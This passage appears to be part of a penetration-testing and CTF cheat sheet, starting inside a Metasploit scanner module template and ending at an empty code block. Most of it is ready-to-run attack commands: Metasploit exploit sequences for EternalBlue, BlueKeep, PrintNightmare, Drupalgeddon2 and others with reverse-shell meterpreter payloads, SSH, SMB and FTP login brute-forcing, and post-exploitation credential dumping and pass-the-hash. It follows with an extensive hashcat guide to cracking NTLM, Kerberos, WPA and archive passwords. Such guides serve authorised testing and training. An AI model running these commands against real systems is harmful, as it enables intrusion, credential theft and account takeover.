  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Example Scanner',
      'Description' => 'Scans for specific vulnerability',
      'Author'      => ['Your Name'],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Base path', '/']),
        OptInt.new('THREADS', [true, 'Number of threads', 10])
      ])
  end

  def run_host(ip)
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri'    => normalize_uri(target_uri.path, 'test.php')
      })

      if res && res.code == 200
        if res.body =~ /vulnerable_pattern/
          print_good("#{ip}:#{rport} - VULNERABLE")
          
          # Report to database
          report_vuln(
            :host  => ip,
            :port  => rport,
            :proto => 'tcp',
            :name  => self.name,
            :info  => "Vulnerability detected"
          )
        else
          print_status("#{ip}:#{rport} - Not vulnerable")
        end
      end
    rescue ::Rex::ConnectionError
      print_error("#{ip}:#{rport} - Connection failed")
    end
  end
end
EOF
```

### Common Exploits and Use Cases

**Windows exploits:**

```bash
# EternalBlue (MS17-010)
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit

# BlueKeep (CVE-2019-0708)
msf6 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set TARGET 2  # Windows 7 SP1 / 2008 R2
msf6 exploit(...) > exploit

# MS08-067 (Conficker)
msf6 > use exploit/windows/smb/ms08_067_netapi
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > exploit

# PrintNightmare (CVE-2021-34527)
msf6 > use exploit/windows/dcerpc/cve_2021_1675_printnightmare
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set SMBUSER username
msf6 exploit(...) > set SMBPASS password
msf6 exploit(...) > exploit
```

**Linux exploits:**

```bash
# Shellshock
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set TARGETURI /cgi-bin/test.sh
msf6 exploit(...) > exploit

# Dirty COW (CVE-2016-5195)
msf6 > use exploit/linux/local/cve_2016_5195_dirtycow
msf6 exploit(...) > set SESSION 1
msf6 exploit(...) > exploit

# Exim4 (CVE-2019-10149)
msf6 > use exploit/linux/smtp/exim4_string_format
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > exploit
```

**Web application exploits:**

```bash
# Apache Struts 2
msf6 > use exploit/multi/http/struts2_content_type_ognl
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set TARGETURI /struts2-showcase
msf6 exploit(...) > exploit

# Drupal Drupalgeddon2 (CVE-2018-7600)
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set TARGETURI /
msf6 exploit(...) > exploit

# WordPress File Manager (CVE-2020-25213)
msf6 > use exploit/multi/http/wp_file_manager_rce
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set TARGETURI /wordpress
msf6 exploit(...) > exploit

# Tomcat Manager Upload
msf6 > use exploit/multi/http/tomcat_mgr_upload
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set HttpUsername tomcat
msf6 exploit(...) > set HttpPassword s3cret
msf6 exploit(...) > exploit

# Jenkins Script Console
msf6 > use exploit/multi/http/jenkins_script_console
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set USERNAME admin
msf6 exploit(...) > set PASSWORD password
msf6 exploit(...) > exploit
```

**Database exploits:**

```bash
# PostgreSQL COPY FROM PROGRAM
msf6 > use exploit/linux/postgres/postgres_copy_from_program_cmd_exec
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set USERNAME postgres
msf6 exploit(...) > set PASSWORD postgres
msf6 exploit(...) > exploit

# MySQL MOF Upload
msf6 > use exploit/windows/mysql/mysql_mof
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set USERNAME root
msf6 exploit(...) > set PASSWORD password
msf6 exploit(...) > exploit

# MSSQL xp_cmdshell
msf6 > use exploit/windows/mssql/mssql_payload
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set USERNAME sa
msf6 exploit(...) > set PASSWORD password
msf6 exploit(...) > exploit
```

### Auxiliary Modules for Enumeration

**Network scanning:**

```bash
# TCP port scan
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(...) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > set PORTS 21,22,80,443,445,3389
msf6 auxiliary(...) > set THREADS 50
msf6 auxiliary(...) > run

# SYN scan
msf6 > use auxiliary/scanner/portscan/syn
msf6 auxiliary(...) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > set THREADS 50
msf6 auxiliary(...) > run

# Service identification
msf6 > use auxiliary/scanner/portscan/ack
msf6 > use auxiliary/scanner/discovery/arp_sweep
msf6 > use auxiliary/scanner/discovery/udp_sweep
```

**SMB enumeration:**

```bash
# SMB version detection
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(...) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > run

# Enumerate shares
msf6 > use auxiliary/scanner/smb/smb_enumshares
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set SMBUser guest
msf6 auxiliary(...) > set SMBPass ""
msf6 auxiliary(...) > run

# Enumerate users
msf6 > use auxiliary/scanner/smb/smb_enumusers
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run

# Check for MS17-010
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(...) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > run

# SMB login bruteforce
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set SMBUser administrator
msf6 auxiliary(...) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(...) > run
```

**HTTP enumeration:**

```bash
# HTTP version
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(...) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > set THREADS 20
msf6 auxiliary(...) > run

# Directory bruteforce
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set DICTIONARY /usr/share/wordlists/dirb/common.txt
msf6 auxiliary(...) > run

# Title grabber
msf6 > use auxiliary/scanner/http/title
msf6 auxiliary(...) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > run

# Robots.txt scanner
msf6 > use auxiliary/scanner/http/robots_txt
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run

# HTTP login bruteforce
msf6 > use auxiliary/scanner/http/http_login
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set AUTH_URI /login
msf6 auxiliary(...) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/http_default_userpass.txt
msf6 auxiliary(...) > run
```

**SSH enumeration:**

```bash
# SSH version
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(...) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > run

# SSH login bruteforce
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set USERNAME root
msf6 auxiliary(...) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(...) > set THREADS 10
msf6 auxiliary(...) > set VERBOSE true
msf6 auxiliary(...) > run

# SSH key login
msf6 > use auxiliary/scanner/ssh/ssh_login_pubkey
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set USERNAME root
msf6 auxiliary(...) > set KEY_PATH /root/.ssh/id_rsa
msf6 auxiliary(...) > run

# SSH enumeration (username enum)
msf6 > use auxiliary/scanner/ssh/ssh_enumusers
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
msf6 auxiliary(...) > run
```

**FTP enumeration:**

```bash
# FTP version
msf6 > use auxiliary/scanner/ftp/ftp_version
msf6 auxiliary(...) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > run

# Anonymous FTP
msf6 > use auxiliary/scanner/ftp/anonymous
msf6 auxiliary(...) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > run

# FTP login bruteforce
msf6 > use auxiliary/scanner/ftp/ftp_login
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set USERNAME admin
msf6 auxiliary(...) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(...) > run
```

**MySQL enumeration:**

```bash
# MySQL version
msf6 > use auxiliary/scanner/mysql/mysql_version
msf6 auxiliary(...) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > run

# MySQL login
msf6 > use auxiliary/scanner/mysql/mysql_login
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set USERNAME root
msf6 auxiliary(...) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf6 auxiliary(...) > run

# MySQL hashdump
msf6 > use auxiliary/scanner/mysql/mysql_hashdump
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set USERNAME root
msf6 auxiliary(...) > set PASSWORD password
msf6 auxiliary(...) > run

# MySQL file enum
msf6 > use auxiliary/scanner/mysql/mysql_file_enum
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set USERNAME root
msf6 auxiliary(...) > set PASSWORD password
msf6 auxiliary(...) > set FILE_LIST /etc/passwd
msf6 auxiliary(...) > run
```

### CTF-Specific Workflows

**Quick win enumeration:**

```bash
# Step 1: Identify live hosts
msf6 > use auxiliary/scanner/discovery/arp_sweep
msf6 auxiliary(...) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > set THREADS 50
msf6 auxiliary(...) > run

# Step 2: Port scan
msf6 > db_nmap -sV -sC -p- --open 192.168.1.100

# Step 3: Check for low-hanging fruit
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(...) > services -p 445 -R
msf6 auxiliary(...) > run

# Step 4: If vulnerable, exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > services -p 445 -R
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit
```

**Web application attack workflow:**

```bash
# Enumerate web services
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(...) > services -p 80,443,8080 -R
msf6 auxiliary(...) > run

# Check for common vulns
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 > use auxiliary/scanner/http/files_dir
msf6 > use auxiliary/scanner/http/backup_file

# Check specific applications
msf6 > search drupal
msf6 > search wordpress
msf6 > search joomla
msf6 > search tomcat

# Exploit if found
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > exploit
```

**Credential harvesting workflow:**

```bash
# After gaining initial access
meterpreter > getsystem
meterpreter > load kiwi
meterpreter > creds_all

# Dump hashes
meterpreter > hashdump

# Background and use hashes
meterpreter > background
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(...) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > set SMBUser Administrator
msf6 auxiliary(...) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf6 auxiliary(...) > run
```

---

## hashcat

### Overview

Hashcat is the world's fastest password recovery tool, supporting over 300 hash types. It utilizes CPU and GPU processing power for brute-force, dictionary, and rule-based attacks on password hashes.

### Installation and Setup

**Installing hashcat on Kali Linux:**

```bash
# Hashcat is pre-installed on Kali
# Update to latest version
sudo apt update
sudo apt install hashcat

# Verify installation
hashcat --version

# Check GPU support
hashcat -I

# Expected output shows available devices:
# Backend API: OpenCL
# Backend Devices:
# - Device #1: NVIDIA GeForce GTX 1080
```

**Initial configuration:**

```bash
# Create working directory
mkdir ~/hashcat
cd ~/hashcat

# Download common wordlists
sudo apt install wordlists
# Or manually:
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# Download rule files (hashcat includes many)
ls /usr/share/hashcat/rules/
# best64.rule, leetspeak.rule, rockyou-30000.rule, etc.
```

**GPU driver setup (for optimal performance):**

```bash
# For NVIDIA GPUs
sudo apt install nvidia-driver nvidia-cuda-toolkit

# For AMD GPUs
sudo apt install rocm-opencl-runtime

# Verify GPU detection
hashcat -I | grep -i "device"

# Benchmark GPU
hashcat -b
```

### Hash Mode Identification

**Common hash types and modes:**

```bash
# Hash mode reference
hashcat --example-hashes | grep -A 2 "MD5"

# Most common modes:
# 0     = MD5
# 100   = SHA1
# 1000  = NTLM
# 1400  = SHA256
# 1700  = SHA512
# 1800  = sha512crypt $6$, SHA512 (Unix)
# 3200  = bcrypt $2*$, Blowfish (Unix)
# 5600  = NetNTLMv2
# 13100 = Kerberos 5 TGS-REP etype 23
# 18200 = Kerberos 5 AS-REP etype 23
# 22000 = WPA-PBKDF2-PMKID+EAPOL

# Web application hashes:
# 0     = MD5 (raw)
# 10    = md5($pass.$salt)
# 20    = md5($salt.$pass)
# 3800  = md5($salt.$pass.$salt)
# 400   = phpass, WordPress (MD5), phpBB3 (MD5)
# 2611  = vBulletin < v3.8.5
# 2711  = vBulletin >=v3.8.5
# 7900  = Drupal7
```

**Identifying hash types:**

```bash
# Using hash-identifier
hash-identifier
# Paste hash when prompted

# Using hashid
echo "5f4dcc3b5aa765d61d8327deb882cf99" | hashid
# Output: MD5

hashid hash.txt
# Analyzes file of hashes

# Manual identification by length:
# 32 chars = MD5, NTLM
# 40 chars = SHA-1
# 56 chars = SHA-224
# 64 chars = SHA-256
# 96 chars = SHA-384
# 128 chars = SHA-512
```

### Basic Usage

**Dictionary attack:**

```bash
# Basic syntax
hashcat -m <hash_mode> -a 0 <hash_file> <wordlist>

# MD5 crack
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# SHA-256 crack
hashcat -m 1400 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# NTLM crack
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# With output file
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt

# Show progress
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --status

# Force mode (if warnings)
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

**Attack modes:**

```bash
# -a 0: Straight (dictionary)
hashcat -m 0 -a 0 hash.txt wordlist.txt

# -a 1: Combination (combine two wordlists)
hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt

# -a 3: Brute-force (mask attack)
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a

# -a 6: Hybrid Wordlist + Mask
hashcat -m 0 -a 6 hash.txt wordlist.txt ?d?d?d

# -a 7: Hybrid Mask + Wordlist
hashcat -m 0 -a 7 hash.txt ?d?d?d wordlist.txt

# -a 9: Association (not commonly used)
```

### Rule-Based Attacks

**Using rules:**

```bash
# Apply rules to wordlist
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Multiple rules
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule

# Common rule files:
# best64.rule - Top 64 rules
# best1024.rule - Extended rule set
# leetspeak.rule - Character substitutions
# rockyou-30000.rule - Rockyou-based rules
# d3ad0ne.rule - Complex rules
# dive.rule - Deep rule set
# unix-ninja-leetspeak.rule - Advanced substitutions
```

**Custom rules:**

```bash
# Create custom rule file
cat > custom.rule << 'EOF'
# Append numbers
$1
$2
$3
$123

# Prepend
^1
^2
^@

# Capitalize
c

# Uppercase
u

# Lowercase
l

# Toggle case
t

# Duplicate
d

# Reflect (reverse)
r

# Combinations
c $!
c $123
u $2023
EOF

# Use custom rules
hashcat -m 0 -a 0 hash.txt wordlist.txt -r custom.rule
```

**Rule syntax reference:**

```bash
# Nothing: Do nothing (passthrough)
:

# Lowercase all: password -> password
l

# Uppercase all: password -> PASSWORD
u

# Capitalize: password -> Password
c

# Invert capitalize: Password -> pASSWORD
C

# Toggle case: PassWord -> pASSwORD
t

# Toggle @ N: Toggle case of char at position N
T N

# Reverse: password -> drowssap
r

# Duplicate: password -> passwordpassword
d

# Duplicate N times
p N

# Reflect: password -> passworddrowssap
f

# Rotate left: password -> asswordp
{

# Rotate right: password -> ppasswor
}

# Append character: password + 1 -> password1
$ X

# Prepend character: @ + password -> @password
^ X

# Truncate left: -password -> assword
[

# Truncate right: password- -> passwor
]

# Delete @ N: Remove char at position N
D N

# Extract range
x N M

# Insert @ N: Insert char X at position N
i N X

# Overwrite @ N: Replace char at position N with X
o N X

# Substitute: Replace all X with Y
s X Y

# Examples:
# c $1 $2 $3 = Password123
# u $! = PASSWORD!
# l r = drowssap
# c $@ $@ $@ = Password@@@
```

### Mask Attacks (Brute-Force)

**Mask syntax:**

```bash
# Built-in charsets:
# ?l = lowercase letters (a-z)
# ?u = uppercase letters (A-Z)
# ?d = digits (0-9)
# ?h = hex (0-9a-f)
# ?H = HEX (0-9A-F)
# ?s = special characters
# ?a = all characters (?l?u?d?s)
# ?b = binary (0x00-0xff)

# 6-digit PIN
hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d

# 8 character lowercase
hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l?l?l

# Password + 3 digits (e.g., password123)
hashcat -m 0 -a 6 hash.txt wordlist.txt ?d?d?d

# Mixed: Uppercase + 6 lowercase + 2 digits
hashcat -m 0 -a 3 hash.txt ?u?l?l?l?l?l?l?d?d

# All characters, 4 length
hashcat -m 0 -a 3 hash.txt ?a?a?a?a
```

**Custom charsets:**

```bash
# Define custom charset
# -1 = custom charset 1
# -2 = custom charset 2
# -3 = custom charset 3
# -4 = custom charset 4

# Only vowels
hashcat -m 0 -a 3 hash.txt -1 aeiou ?1?1?1?1?1?1

# Hex digits only
hashcat -m 0 -a 3 hash.txt -1 0123456789abcdef ?1?1?1?1?1?1?1?1

# Letters and numbers (no specials)
hashcat -m 0 -a 3 hash.txt -1 ?l?u?d ?1?1?1?1?1?1?1?1

# Common password patterns
# Uppercase + lowercases + digits
hashcat -m 0 -a 3 hash.txt -1 ?u -2 ?l?d ?1?2?2?2?2?2?2?2

# Year pattern (19xx or 20xx)
hashcat -m 0 -a 6 hash.txt wordlist.txt -1 ?d 19?1?1
hashcat -m 0 -a 6 hash.txt wordlist.txt -1 ?d 20?1?1
```

**Incremental mask attacks:**

```bash
# Try all lengths from 1 to 8
hashcat -m 0 -a 3 hash.txt --increment --increment-min=1 --increment-max=8 ?a

# Only digits, length 4-8
hashcat -m 0 -a 3 hash.txt --increment --increment-min=4 --increment-max=8 ?d

# Lowercase letters, length 1-6
hashcat -m 0 -a 3 hash.txt --increment --increment-min=1 --increment-max=6 ?l
```

### Performance Optimization

**GPU tuning:**

```bash
# Use specific devices
hashcat -m 0 -a 0 hash.txt wordlist.txt -d 1 # Use device 1 hashcat -m 0 -a 0 hash.txt wordlist.txt -d 1,2 # Use devices 1 and 2

# Workload profile

hashcat -m 0 -a 0 hash.txt wordlist.txt -w 3

# -w 1: Low (desktop usable)

# -w 2: Default (desktop usable)

# -w 3: High (desktop becomes slow)

# -w 4: Nightmare (dedicated cracking, may freeze system)

# Optimize kernel

hashcat -m 0 -a 0 hash.txt wordlist.txt -O

# Enables optimized kernel, limited password length but faster

# Combined optimization

hashcat -m 0 -a 0 hash.txt wordlist.txt -w 4 -O --force

# Show performance stats

hashcat -m 0 -a 0 hash.txt wordlist.txt --status --status-timer=10

# Benchmark specific hash type

hashcat -b -m 0 # MD5 benchmark hashcat -b -m 1000 # NTLM benchmark hashcat -b -m 3200 # bcrypt benchmark
````

**Session management:**

```bash
# Create named session
hashcat -m 0 -a 0 hash.txt wordlist.txt --session=mysession

# Resume session
hashcat --session=mysession --restore

# List sessions
ls ~/.hashcat/sessions/

# Checkpoint (auto-saves progress)
# Default: every 10 seconds
hashcat -m 0 -a 0 hash.txt wordlist.txt --status-timer=5

# Skip to position (useful after interruption)
hashcat -m 0 -a 0 hash.txt wordlist.txt --skip=1000000 --limit=2000000
````

**Potfile management:**

```bash
# Potfile stores cracked hashes
# Location: ~/.hashcat/hashcat.potfile

# View potfile
cat ~/.hashcat/hashcat.potfile

# Show cracked passwords for specific hash file
hashcat -m 0 hash.txt --show

# Show in specific format
hashcat -m 0 hash.txt --show --outfile-format=2
# Formats:
# 1 = hash[:salt]
# 2 = plain
# 3 = hex_plain
# 4 = crack_pos
# 5 = timestamp absolute
# 6 = timestamp relative

# Disable potfile (don't save cracks)
hashcat -m 0 -a 0 hash.txt wordlist.txt --potfile-disable

# Use custom potfile location
hashcat -m 0 -a 0 hash.txt wordlist.txt --potfile-path=/tmp/custom.pot

# Remove potfile (start fresh)
rm ~/.hashcat/hashcat.potfile
```

### Hash Formats and Preparation

**Single hash:**

```bash
# Just the hash
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
hashcat -m 0 -a 0 hash.txt wordlist.txt
```

**Hash with salt:**

```bash
# Format: hash:salt
echo "hash:salt" > hash.txt

# md5($pass.$salt)
echo "098f6bcd4621d373cade4e832627b4f6:somesalt" > hash.txt
hashcat -m 10 -a 0 hash.txt wordlist.txt

# sha256($pass.$salt)
echo "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:salt" > hash.txt
hashcat -m 1410 -a 0 hash.txt wordlist.txt
```

**Username:hash format:**

```bash
# Format: username:hash
echo "admin:5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
hashcat -m 0 -a 0 hash.txt wordlist.txt --username

# Output includes username
hashcat -m 0 hash.txt --show --username
```

**Multiple hashes:**

```bash
# One hash per line
cat > hashes.txt << 'EOF'
5f4dcc3b5aa765d61d8327deb882cf99
098f6bcd4621d373cade4e832627b4f6
5d41402abc4b2a76b9719d911017c592
EOF

hashcat -m 0 -a 0 hashes.txt wordlist.txt
```

**NTLM hashes (from SAM/hashdump):**

```bash
# Windows SAM format: username:RID:LM:NTLM:::
# Extract NTLM only
cat sam.txt | cut -d: -f4 > ntlm.txt

# Or use full format with --username
hashcat -m 1000 -a 0 sam.txt wordlist.txt --username
```

**NetNTLMv2 (from Responder):**

```bash
# Format: username::domain:challenge:HMAC-MD5:blob
# Use as-is
hashcat -m 5600 -a 0 netntlmv2.txt wordlist.txt
```

**Linux shadow file:**

```bash
# Extract hash from /etc/shadow
# Format: $id$salt$hash

# $6$ = SHA-512 (mode 1800)
echo '$6$rounds=5000$salt$hash' > shadow.txt
hashcat -m 1800 -a 0 shadow.txt wordlist.txt

# $5$ = SHA-256 (mode 7400)
hashcat -m 7400 -a 0 shadow.txt wordlist.txt

# $1$ = MD5 (mode 500)
hashcat -m 500 -a 0 shadow.txt wordlist.txt
```

### Specific Hash Type Attacks

**WPA/WPA2 cracking:**

```bash
# Capture handshake with aircrack-ng or similar
# Convert to hashcat format with hcxpcapngtool or cap2hccapx

# Using hcxpcapngtool (newer)
hcxpcapngtool -o capture.22000 capture.pcapng

# Crack WPA2
hashcat -m 22000 -a 0 capture.22000 /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 22000 -a 0 capture.22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# PMKID attack (even without full handshake)
hashcat -m 22000 -a 0 pmkid.22000 wordlist.txt
```

**Kerberos TGS-REP (Kerberoasting):**

```bash
# Hash extracted from Rubeus, Impacket, or similar
# Format: $krb5tgs$23$*user$realm$spn*$hash

hashcat -m 13100 -a 0 tgs.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Optimize for long passwords
hashcat -m 13100 -a 0 tgs.txt wordlist.txt -w 4
```

**Kerberos AS-REP (ASREPRoasting):**

```bash
# Hash format: $krb5asrep$23$user@domain:hash

hashcat -m 18200 -a 0 asrep.txt wordlist.txt
```

**Office document hashes:**

```bash
# Extract hash with office2john.py or john
office2john.py document.docx > office_hash.txt

# Office 2007-2013
hashcat -m 9400 -a 0 office_hash.txt wordlist.txt

# Office 2016/2019
hashcat -m 9600 -a 0 office_hash.txt wordlist.txt
```

**ZIP/RAR archives:**

```bash
# ZIP hash (extract with zip2john)
zip2john archive.zip > zip_hash.txt
hashcat -m 17200 -a 0 zip_hash.txt wordlist.txt

# RAR3 hash
rar2john archive.rar > rar_hash.txt
hashcat -m 12500 -a 0 rar_hash.txt wordlist.txt

# RAR5 hash
hashcat -m 13000 -a 0 rar5_hash.txt wordlist.txt

# 7-Zip
7z2john archive.7z > 7z_hash.txt
hashcat -m 11600 -a 0 7z_hash.txt wordlist.txt
```

**PDF hashes:**

```bash
# Extract hash with pdf2john.pl
pdf2john.pl document.pdf > pdf_hash.txt

# PDF 1.4-1.6 (mode 10500)
hashcat -m 10500 -a 0 pdf_hash.txt wordlist.txt

# PDF 1.7 Level 3 (mode 10700)
hashcat -m 10700 -a 0 pdf_hash.txt wordlist.txt
```

**Database hashes:**

```bash
# MySQL (old)
hashcat -m 200 -a 0 mysql.txt wordlist.txt

# MySQL (new, MySQL 4.1+)
hashcat -m 300 -a 0 mysql.txt wordlist.txt

# PostgreSQL MD5
hashcat -m 112 -a 0 postgres.txt wordlist.txt

# MSSQL (2000)
hashcat -m 131 -a 0 mssql.txt wordlist.txt

# MSSQL (2005+)
hashcat -m 132 -a 0 mssql.txt wordlist.txt

# Oracle 11g/12c
hashcat -m 112 -a 0 oracle.txt wordlist.txt
```

**WordPress/phpBB hashes:**

```bash
# phpass (WordPress, phpBB3)
hashcat -m 400 -a 0 wordpress.txt wordlist.txt

# With rules for better coverage
hashcat -m 400 -a 0 wordpress.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

### Advanced Techniques

**Combinator attacks:**

```bash
# Combine words from two lists
# password + 123 = password123
hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt

# Example: First names + last names
hashcat -m 0 -a 1 hash.txt firstnames.txt lastnames.txt

# With separator
# Create custom combinator script
cat > combine.sh << 'EOF'
#!/bin/bash
while IFS= read -r word1; do
    while IFS= read -r word2; do
        echo "${word1}_${word2}"
    done < "$2"
done < "$1"
EOF

chmod +x combine.sh
./combine.sh words1.txt words2.txt > combined.txt
hashcat -m 0 -a 0 hash.txt combined.txt
```

**Hybrid attacks:**

```bash
# Wordlist + mask (append)
# password + digits
hashcat -m 0 -a 6 hash.txt wordlist.txt ?d?d?d?d

# Common patterns:
# Word + year
hashcat -m 0 -a 6 hash.txt wordlist.txt 20?d?d
hashcat -m 0 -a 6 hash.txt wordlist.txt 19?d?d

# Word + special + digits
hashcat -m 0 -a 6 hash.txt wordlist.txt ?s?d?d?d

# Mask + wordlist (prepend)
# Digits + password
hashcat -m 0 -a 7 hash.txt ?d?d?d?d wordlist.txt

# Year + word
hashcat -m 0 -a 7 hash.txt 20?d?d wordlist.txt
```

**Mask files for targeted attacks:**

```bash
# Create mask file with common patterns
cat > masks.hcmask << 'EOF'
?u?l?l?l?l?d?d
?u?l?l?l?l?d?d?d
?u?l?l?l?l?l?d?d
?u?l?l?l?l?l?d?d?d
?u?l?l?l?l?l?l?d?d
?l?l?l?l?d?d?d?d
?l?l?l?l?l?d?d?d?d
?u?l?l?l?l?s?d?d
EOF

# Use mask file
hashcat -m 0 -a 3 hash.txt masks.hcmask

# With probabilities (requires hashcat-utils)
# maskprocessor can generate candidates
mp64.bin ?u?l?l?l?l?l?d?d | hashcat -m 0 -a 0 hash.txt
```

**Markov chains:**

```bash
# Generate markov stats from wordlist
# Requires hashcat-utils statsprocessor
sp64.bin --markov-hcstat2=/usr/share/hashcat/hashcat.hcstat2 \
         --markov-threshold=0 \
         ?l?l?l?l?l?l?l?l | hashcat -m 0 -a 0 hash.txt

# Use with hashcat
hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l?l?l \
        --markov-hcstat2=/usr/share/hashcat/hashcat.hcstat2 \
        --markov-threshold=100
```

**PRINCE attack (PRobability INfinite Chained Elements):**

```bash
# Requires hashcat-utils
# Generate candidates based on input words
pp64.bin --pw-min=8 --pw-max=16 < wordlist.txt | hashcat -m 0 -a 0 hash.txt

# Parameters:
# --pw-min: Minimum password length
# --pw-max: Maximum password length
# --elem-cnt-min: Minimum number of elements
# --elem-cnt-max: Maximum number of elements
```

**Toggle-case attacks:**

```bash
# Try all case combinations
# Using rules
hashcat -m 0 -a 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/toggles1.rule
hashcat -m 0 -a 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/toggles2.rule
hashcat -m 0 -a 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/toggles3.rule
hashcat -m 0 -a 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/toggles4.rule
hashcat -m 0 -a 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/toggles5.rule
```

**Time-memory trade-off with pre-computed tables:**

```bash
